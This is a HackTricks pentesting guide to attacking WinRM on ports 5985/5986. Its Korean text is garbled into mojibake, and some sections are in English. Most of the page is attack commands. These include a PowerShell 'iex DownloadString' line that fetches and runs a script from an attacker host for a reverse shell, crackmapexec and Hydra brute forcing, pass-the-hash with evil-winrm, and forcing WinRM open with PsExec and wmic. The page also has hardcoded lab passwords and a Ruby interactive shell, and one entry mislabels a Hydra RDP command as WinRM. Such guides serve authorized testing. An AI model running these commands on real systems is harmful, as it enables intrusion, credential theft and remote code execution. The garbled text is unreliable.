# 5985,5986 - WinRM íœí…ŒìŠ¤íŒ…

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking Tricksë¥¼ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks)ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

ê²½í—˜ìˆëŠ” í•´ì»¤ì™€ ë²„ê·¸ ë°”ìš´í‹° í—Œí„°ì™€ ì†Œí†µí•˜ê¸° ìœ„í•´ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ì„œë²„ì— ì°¸ì—¬í•˜ì„¸ìš”!

**í•´í‚¹ ì¸ì‚¬ì´íŠ¸**\
í•´í‚¹ì˜ ìŠ¤ë¦´ê³¼ ë„ì „ì„ ë‹¤ë£¨ëŠ” ì½˜í…ì¸ ì™€ ìƒí˜¸ì‘ìš©í•˜ì„¸ìš”.

**ì‹¤ì‹œê°„ í•´í‚¹ ë‰´ìŠ¤**\
ì‹¤ì‹œê°„ ë‰´ìŠ¤ì™€ í†µì°°ë ¥ì„ í†µí•´ ë¹ ë¥´ê²Œ ë³€í™”í•˜ëŠ” í•´í‚¹ ì„¸ê³„ë¥¼ ë”°ë¼ê°€ì„¸ìš”.

**ìµœì‹  ê³µì§€ì‚¬í•­**\
ìƒˆë¡œìš´ ë²„ê·¸ ë°”ìš´í‹° ì¶œì‹œ ë° ì¤‘ìš”í•œ í”Œë«í¼ ì—…ë°ì´íŠ¸ì— ëŒ€í•œ ì •ë³´ë¥¼ ë°›ì•„ë³´ì„¸ìš”.

**[Discord](https://discord.com/invite/N3FrSbmwdy)ì— ì°¸ì—¬í•˜ì—¬ ìµœê³ ì˜ í•´ì»¤ë“¤ê³¼ í˜‘ì—…ì„ ì‹œì‘í•˜ì„¸ìš”!**

## WinRM

[Windows ì›ê²© ê´€ë¦¬ (WinRM)](https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426\(v=vs.85\).aspx)ì€ Microsoftì—ì„œ ê°•ì¡°í•˜ëŠ” **í”„ë¡œí† ì½œ**ìœ¼ë¡œ, HTTP(S)ë¥¼ í†µí•´ **Windows ì‹œìŠ¤í…œì˜ ì›ê²© ê´€ë¦¬**ë¥¼ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤. ì´ëŠ” WMIë¥¼ ê¸°ë°˜ìœ¼ë¡œ í•˜ë©°, WMI ì‘ì—…ì„ ìœ„í•œ HTTP ê¸°ë°˜ ì¸í„°í˜ì´ìŠ¤ë¡œ ì œê³µë©ë‹ˆë‹¤.

WinRMì´ ì„¤ì¹˜ëœ ì»´í“¨í„°ì—ì„œëŠ” SSHê°€ ë‹¤ë¥¸ ìš´ì˜ ì²´ì œì—ì„œ ì‘ë™í•˜ëŠ” ê²ƒê³¼ ìœ ì‚¬í•˜ê²Œ PowerShellì„ í†µí•´ ê°„í¸í•œ ì›ê²© ê´€ë¦¬ê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤. WinRMì´ ì‘ë™í•˜ëŠ”ì§€ í™•ì¸í•˜ê¸° ìœ„í•´ íŠ¹ì • í¬íŠ¸ì˜ ê°œë°© ì—¬ë¶€ë¥¼ í™•ì¸í•˜ëŠ” ê²ƒì´ ê¶Œì¥ë©ë‹ˆë‹¤:

* **5985/tcp (HTTP)**
* **5986/tcp (HTTPS)**

ìœ„ ëª©ë¡ì—ì„œ ê°œë°©ëœ í¬íŠ¸ëŠ” WinRMì´ ì„¤ì •ë˜ì–´ ìˆìŒì„ ë‚˜íƒ€ë‚´ë©°, ì›ê²© ì„¸ì…˜ì„ ì‹œì‘í•  ìˆ˜ ìˆëŠ” ì‹œë„ë¥¼ í—ˆìš©í•©ë‹ˆë‹¤.

### **WinRM ì„¸ì…˜ ì‹œì‘í•˜ê¸°**

PowerShellì„ WinRMì— êµ¬ì„±í•˜ê¸° ìœ„í•´ Microsoftì˜ `Enable-PSRemoting` cmdletì„ ì‚¬ìš©í•˜ì—¬ ì»´í“¨í„°ë¥¼ ì›ê²© PowerShell ëª…ë ¹ì„ ìˆ˜ë½í•  ìˆ˜ ìˆë„ë¡ ì„¤ì •í•©ë‹ˆë‹¤. ìƒìŠ¹ëœ PowerShell ì•¡ì„¸ìŠ¤ë¡œ ë‹¤ìŒ ëª…ë ¹ì„ ì‹¤í–‰í•˜ì—¬ ì´ ê¸°ëŠ¥ì„ í™œì„±í™”í•˜ê³  ì„ì˜ì˜ í˜¸ìŠ¤íŠ¸ë¥¼ ì‹ ë¢°í•  ìˆ˜ ìˆë„ë¡ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```powershell
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
ì´ ì ‘ê·¼ ë°©ì‹ì€ `trustedhosts` êµ¬ì„±ì— ì™€ì¼ë“œì¹´ë“œë¥¼ ì¶”ê°€í•˜ëŠ” ê²ƒì„ í¬í•¨í•˜ë©°, ì´ëŠ” ê·¸ ì˜í–¥ì„ ê³ ë ¤í•´ ì‹ ì¤‘íˆ ê³ ë ¤í•´ì•¼ í•©ë‹ˆë‹¤. ë˜í•œ, ê³µê²©ìì˜ ì»´í“¨í„°ì—ì„œ "Public"ì—ì„œ "Work"ë¡œ ë„¤íŠ¸ì›Œí¬ ìœ í˜•ì„ ë³€ê²½í•´ì•¼ í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

ë˜í•œ, WinRMì€ ë‹¤ìŒê³¼ ê°™ì´ `wmic` ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ **ì›ê²©ìœ¼ë¡œ í™œì„±í™”**ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```powershell
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
ì´ ë°©ë²•ì€ ì›ê²©ìœ¼ë¡œ WinRMì„ ì„¤ì •í•˜ì—¬ ì›ê²©ì—ì„œ Windows ê¸°ê¸°ë¥¼ ê´€ë¦¬í•˜ëŠ” ìœ ì—°ì„±ì„ í–¥ìƒì‹œí‚µë‹ˆë‹¤.


### êµ¬ì„± í™•ì¸

ê³µê²© ê¸°ê¸°ì˜ ì„¤ì •ì„ í™•ì¸í•˜ê¸° ìœ„í•´ `Test-WSMan` ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ ëŒ€ìƒì´ WinRMì´ ì˜¬ë°”ë¥´ê²Œ êµ¬ì„±ë˜ì—ˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì„ ì‹¤í–‰í•˜ë©´ í”„ë¡œí† ì½œ ë²„ì „ê³¼ wsmidì— ëŒ€í•œ ì„¸ë¶€ ì •ë³´ë¥¼ ë°›ì„ ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” êµ¬ì„±ì´ ì„±ê³µì ìœ¼ë¡œ ì´ë£¨ì–´ì¡ŒìŒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. ì•„ë˜ëŠ” êµ¬ì„±ëœ ëŒ€ìƒê³¼ êµ¬ì„±ë˜ì§€ ì•Šì€ ëŒ€ìƒì— ëŒ€í•œ ì˜ˆìƒ ì¶œë ¥ì„ ë³´ì—¬ì£¼ëŠ” ì˜ˆì‹œì…ë‹ˆë‹¤:

- ì˜¬ë°”ë¥´ê²Œ êµ¬ì„±ëœ ëŒ€ìƒì˜ ê²½ìš°, ì¶œë ¥ì€ ë‹¤ìŒê³¼ ìœ ì‚¬í•  ê²ƒì…ë‹ˆë‹¤:
```bash
Test-WSMan <target-ip>
```
ì‘ë‹µì—ëŠ” WinRMì´ ì˜¬ë°”ë¥´ê²Œ ì„¤ì •ë˜ì–´ ìˆëŠ”ì§€ë¥¼ ë‚˜íƒ€ë‚´ëŠ” í”„ë¡œí† ì½œ ë²„ì „ê³¼ wsmidì— ëŒ€í•œ ì •ë³´ê°€ í¬í•¨ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.

![](<../.gitbook/assets/image (161) (1).png>)

- ë°˜ëŒ€ë¡œ, WinRMì´ êµ¬ì„±ë˜ì§€ ì•Šì€ ëŒ€ìƒì˜ ê²½ìš°ì—ëŠ” í•´ë‹¹í•˜ëŠ” ìì„¸í•œ ì •ë³´ê°€ ì—†ìœ¼ë¯€ë¡œ ì˜¬ë°”ë¥¸ WinRM ì„¤ì •ì˜ ë¶€ì¬ê°€ ê°•ì¡°ë©ë‹ˆë‹¤.

![](<../.gitbook/assets/image (162).png>)

### ëª…ë ¹ ì‹¤í–‰

ëŒ€ìƒ ì»´í“¨í„°ì—ì„œ ì›ê²©ìœ¼ë¡œ `ipconfig`ë¥¼ ì‹¤í–‰í•˜ê³  ì¶œë ¥ì„ ë³´ë ¤ë©´ ë‹¤ìŒì„ ìˆ˜í–‰í•˜ì„¸ìš”:
```powershell
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../.gitbook/assets/image (163) (1).png>)

ë˜í•œ **Invoke-Command**ë¥¼ í†µí•´ í˜„ì¬ PS ì½˜ì†”ì—ì„œ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ë¡œì»¬ì— _enumeration_ì´ë¼ëŠ” í•¨ìˆ˜ê°€ ìˆê³  ì´ë¥¼ ì›ê²© ì»´í“¨í„°ì—ì„œ ì‹¤í–‰í•˜ë ¤ë©´ ë‹¤ìŒê³¼ ê°™ì´ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```powershell
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰

To execute a script on a target machine through WinRM, you can use the `Invoke-Command` cmdlet in PowerShell. This cmdlet allows you to run commands or scripts on remote machines.

Here is an example of how to execute a script using `Invoke-Command`:

```powershell
Invoke-Command -ComputerName <target_ip> -ScriptBlock { <script_content> }
```

Replace `<target_ip>` with the IP address of the target machine and `<script_content>` with the actual content of your script.

Make sure that WinRM is enabled on the target machine and that you have the necessary permissions to execute scripts remotely.
```powershell
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### ë¦¬ë²„ìŠ¤ ì‰˜ íšë“

To get a reverse shell on a target machine, you can follow these steps:

1. Generate a payload: Use a tool like msfvenom to generate a reverse shell payload. Specify the IP address and port where you want to receive the shell connection.

2. Set up a listener: Start a listener on your machine using a tool like netcat or Metasploit's multi/handler module. This will listen for incoming connections from the target machine.

3. Execute the payload: Transfer the payload to the target machine and execute it. This can be done through various methods, such as exploiting a vulnerability or using social engineering techniques.

4. Establish the connection: Once the payload is executed on the target machine, it will attempt to connect back to your listener. If successful, you will have a reverse shell session, allowing you to interact with the target machine's command prompt.

Remember to use these techniques responsibly and only on systems you have permission to test.
```powershell
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### PS ì„¸ì…˜ ì–»ê¸°

ëŒ€í™”í˜• PowerShell ì…¸ì„ ì–»ìœ¼ë ¤ë©´ `Enter-PSSession`ì„ ì‚¬ìš©í•˜ì„¸ìš”:
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../.gitbook/assets/image (164).png>)

**ì„¸ì…˜ì€ "í”¼í•´ì" ë‚´ì—ì„œ ìƒˆë¡œìš´ í”„ë¡œì„¸ìŠ¤(wsmprovhost)ì—ì„œ ì‹¤í–‰ë©ë‹ˆë‹¤.**

### **WinRM ê°•ì œë¡œ ì—´ê¸°**

PS Remotingê³¼ WinRMì„ ì‚¬ìš©í•˜ë ¤ë©´ ì»´í“¨í„°ê°€ êµ¬ì„±ë˜ì–´ ìˆì§€ ì•Šì€ ê²½ìš° ë‹¤ìŒê³¼ ê°™ì´ í™œì„±í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```powershell
.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
### ì„¸ì…˜ ì €ì¥ ë° ë³µì›

ì›ê²© ì»´í“¨í„°ì—ì„œ **ì–¸ì–´**ê°€ **ì œí•œ**ë˜ì–´ ìˆëŠ” ê²½ìš°ì—ëŠ” ì´ ë°©ë²•ì´ **ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**.
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
ì´ ì„¸ì…˜ì—ì„œëŠ” _Invoke-Command_ë¥¼ ì‚¬ìš©í•˜ì—¬ PS ìŠ¤í¬ë¦½íŠ¸ë¥¼ ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```powershell
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### ì˜¤ë¥˜

ë‹¤ìŒê³¼ ê°™ì€ ì˜¤ë¥˜ë¥¼ ë°œê²¬í•˜ë©´:

`enter-pssession : ì›ê²© ì„œë²„ 10.10.10.175ì— ëŒ€í•œ ì—°ê²°ì— ì‹¤íŒ¨í–ˆìŠµë‹ˆë‹¤. ë‹¤ìŒ ì˜¤ë¥˜ ë©”ì‹œì§€ì™€ í•¨ê»˜ ì‹¤íŒ¨í–ˆìŠµë‹ˆë‹¤. WinRM í´ë¼ì´ì–¸íŠ¸ëŠ” ìš”ì²­ì„ ì²˜ë¦¬í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤. ì¸ì¦ ì²´ê³„ê°€ Kerberosì™€ ë‹¤ë¥¸ ê²½ìš° ë˜ëŠ” í´ë¼ì´ì–¸íŠ¸ ì»´í“¨í„°ê°€ ë„ë©”ì¸ì— ê°€ì…ë˜ì–´ ìˆì§€ ì•Šì€ ê²½ìš° HTTPS ì „ì†¡ì„ ì‚¬ìš©í•˜ê±°ë‚˜ ëŒ€ìƒ ì»´í“¨í„°ë¥¼ TrustedHosts êµ¬ì„± ì„¤ì •ì— ì¶”ê°€í•´ì•¼ í•©ë‹ˆë‹¤. TrustedHosts ëª©ë¡ì— ìˆëŠ” ì»´í“¨í„°ëŠ” ì¸ì¦ë˜ì§€ ì•Šì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒ ëª…ë ¹ì„ ì‹¤í–‰í•˜ì—¬ ê´€ë ¨ ì •ë³´ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. winrm help config. ìì„¸í•œ ì •ë³´ëŠ” about_Remote_Troubleshooting ë„ì›€ë§ ì£¼ì œë¥¼ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤.`

í´ë¼ì´ì–¸íŠ¸ì—ì„œ ë‹¤ìŒì„ ì‹œë„í•˜ì‹­ì‹œì˜¤ (ì •ë³´ëŠ” [ì—¬ê¸°](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)ì—ì„œ ì–»ìŒ):
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ì„œë²„ì— ê°€ì…í•˜ì—¬ ê²½í—˜ìˆëŠ” í•´ì»¤ì™€ ë²„ê·¸ ë°”ìš´í‹° í—Œí„°ë“¤ê³¼ ì†Œí†µí•˜ì„¸ìš”!

**í•´í‚¹ ì¸ì‚¬ì´íŠ¸**\
í•´í‚¹ì˜ ìŠ¤ë¦´ê³¼ ë„ì „ì— ëŒ€í•´ ê¹Šì´ íŒŒê³ ë“œëŠ” ì½˜í…ì¸ ì™€ ìƒí˜¸ì‘ìš©í•˜ì„¸ìš”.

**ì‹¤ì‹œê°„ í•´í‚¹ ë‰´ìŠ¤**\
ì‹¤ì‹œê°„ ë‰´ìŠ¤ì™€ ì¸ì‚¬ì´íŠ¸ë¥¼ í†µí•´ ë¹ ë¥´ê²Œ ë³€í™”í•˜ëŠ” í•´í‚¹ ì„¸ê³„ë¥¼ ë”°ë¼ê°€ì„¸ìš”.

**ìµœì‹  ê³µì§€ì‚¬í•­**\
ìƒˆë¡œìš´ ë²„ê·¸ ë°”ìš´í‹° ì¶œì‹œ ë° ì¤‘ìš”í•œ í”Œë«í¼ ì—…ë°ì´íŠ¸ì— ëŒ€í•´ ìµœì‹  ì •ë³´ë¥¼ ë°›ì•„ë³´ì„¸ìš”.

**[Discord](https://discord.com/invite/N3FrSbmwdy)**ì— ê°€ì…í•˜ì—¬ ìµœê³ ì˜ í•´ì»¤ë“¤ê³¼ í˜‘ì—…ì„ ì‹œì‘í•˜ì„¸ìš”!

## ë¦¬ëˆ…ìŠ¤ì—ì„œì˜ WinRM ì—°ê²°

### ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©

ì£¼ì˜í•˜ì„¸ìš”, WinRMì˜ ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©ì€ ì‚¬ìš©ìë¥¼ ì°¨ë‹¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### ì•…ì„±-winrm ì‚¬ìš©í•˜ê¸°

Evil-winrmì€ Rubyë¡œ ì‘ì„±ëœ ì›ê²© ê´€ë¦¬ ë„êµ¬ë¡œ, Windows ì›ê²© ê´€ë¦¬(Remote Management) ì„œë¹„ìŠ¤(Remote Management Service, WinRM)ë¥¼ ì•…ìš©í•˜ì—¬ ì›ê²© ì‹œìŠ¤í…œì— ì•¡ì„¸ìŠ¤í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. ì´ ë„êµ¬ëŠ” WinRMì„ í†µí•´ ì¸ì¦ëœ ì‚¬ìš©ìë¡œ ë¡œê·¸ì¸í•˜ê³  ëª…ë ¹ ì‹¤í–‰, íŒŒì¼ ì „ì†¡ ë“± ë‹¤ì–‘í•œ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Evil-winrmì„ ì‚¬ìš©í•˜ì—¬ ì›ê²© ì‹œìŠ¤í…œì— ì ‘ì†í•˜ë ¤ë©´ ë‹¤ìŒ ëª…ë ¹ì„ ì‹¤í–‰í•©ë‹ˆë‹¤:

```plaintext
evil-winrm -i <target-ip> -u <username> -p <password>
```

- `<target-ip>`: ëŒ€ìƒ ì‹œìŠ¤í…œì˜ IP ì£¼ì†Œì…ë‹ˆë‹¤.
- `<username>`: ìœ íš¨í•œ ì‚¬ìš©ì ê³„ì •ì˜ ì´ë¦„ì…ë‹ˆë‹¤.
- `<password>`: í•´ë‹¹ ì‚¬ìš©ì ê³„ì •ì˜ ì•”í˜¸ì…ë‹ˆë‹¤.

ìœ„ ëª…ë ¹ì„ ì‹¤í–‰í•˜ë©´ Evil-winrmì´ ëŒ€ìƒ ì‹œìŠ¤í…œì— ì—°ê²°ë˜ê³ , ëª…ë ¹ í”„ë¡¬í”„íŠ¸ì™€ ìœ ì‚¬í•œ ì¸í„°í˜ì´ìŠ¤ë¥¼ ì œê³µí•©ë‹ˆë‹¤. ì´ì œ ì›ê²© ì‹œìŠ¤í…œì—ì„œ ëª…ë ¹ì„ ì‹¤í–‰í•˜ê±°ë‚˜ íŒŒì¼ì„ ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Evil-winrmì€ WinRM ì„œë¹„ìŠ¤ê°€ í™œì„±í™”ë˜ì–´ ìˆëŠ” ì‹œìŠ¤í…œì—ì„œë§Œ ì‘ë™í•˜ë¯€ë¡œ, ëŒ€ìƒ ì‹œìŠ¤í…œì—ì„œ WinRMì´ í™œì„±í™”ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸í•´ì•¼ í•©ë‹ˆë‹¤.
```ruby
gem install evil-winrm
```
**ë¬¸ì„œ**ë¥¼ ì½ìœ¼ì„¸ìš”: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
**IPv6 ì£¼ì†Œ**ì— ì—°ê²°í•˜ê¸° ìœ„í•´ evil-winrmì„ ì‚¬ìš©í•˜ë ¤ë©´ _**/etc/hosts**_ ë‚´ì— **ë„ë©”ì¸ ì´ë¦„**ì„ IPv6 ì£¼ì†Œì— ì„¤ì •í•˜ê³  í•´ë‹¹ ë„ë©”ì¸ì— ì—°ê²°í•˜ì‹­ì‹œì˜¤.

### evil-winrmì„ ì‚¬ìš©í•˜ì—¬ í•´ì‹œ ì „ë‹¬í•˜ê¸°
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
![](<../.gitbook/assets/image (173).png>)

### PS-docker ë¨¸ì‹  ì‚¬ìš©í•˜ê¸°
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### ë£¨ë¹„ ìŠ¤í¬ë¦½íŠ¸ ì‚¬ìš©

**ë‹¤ìŒ ì½”ë“œëŠ” ì—¬ê¸°ì—ì„œ ì¶”ì¶œë˜ì—ˆìŠµë‹ˆë‹¤: [https://alamot.github.io/winrm\_shell/](https://alamot.github.io/winrm\_shell/)**
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt
# https://alamot.github.io/winrm_shell/


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

* `port:5985 Microsoft-HTTPAPI`

## ì°¸ê³  ìë£Œ

* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## HackTricks ìë™ ëª…ë ¹ì–´
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p â€˜MySuperSecr3tPass123!â€™

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.xyz/pentesting/pentesting-winrm

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ì„œë²„ì— ê°€ì…í•˜ì—¬ ê²½í—˜ ë§ì€ í•´ì»¤ì™€ ë²„ê·¸ ë°”ìš´í‹° í—Œí„°ë“¤ê³¼ ì†Œí†µí•˜ì„¸ìš”!

**í•´í‚¹ ì¸ì‚¬ì´íŠ¸**\
í•´í‚¹ì˜ ìŠ¤ë¦´ê³¼ ë„ì „ì— ëŒ€í•´ ê¹Šì´ íŒŒê³ ë“¤ ìˆ˜ ìˆëŠ” ì½˜í…ì¸ ì™€ ìƒí˜¸ì‘ìš©í•˜ì„¸ìš”.

**ì‹¤ì‹œê°„ í•´í‚¹ ë‰´ìŠ¤**\
ì‹¤ì‹œê°„ ë‰´ìŠ¤ì™€ ì¸ì‚¬ì´íŠ¸ë¥¼ í†µí•´ ë¹ ë¥´ê²Œ ë³€í™”í•˜ëŠ” í•´í‚¹ ì„¸ê³„ë¥¼ ë”°ë¼ê°€ì„¸ìš”.

**ìµœì‹  ê³µì§€ì‚¬í•­**\
ìƒˆë¡œìš´ ë²„ê·¸ ë°”ìš´í‹° ì¶œì‹œ ë° ì¤‘ìš”í•œ í”Œë«í¼ ì—…ë°ì´íŠ¸ì— ëŒ€í•´ ìµœì‹  ì •ë³´ë¥¼ ë°›ì•„ë³´ì„¸ìš”.

**[Discord](https://discord.com/invite/N3FrSbmwdy)**ì— ê°€ì…í•˜ì—¬ ìµœê³ ì˜ í•´ì»¤ë“¤ê³¼ í˜‘ì—…ì„ ì‹œì‘í•˜ì„¸ìš”!

<details>

<summary><strong>**htARTE (HackTricks AWS Red Team Expert)**ë¡œ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
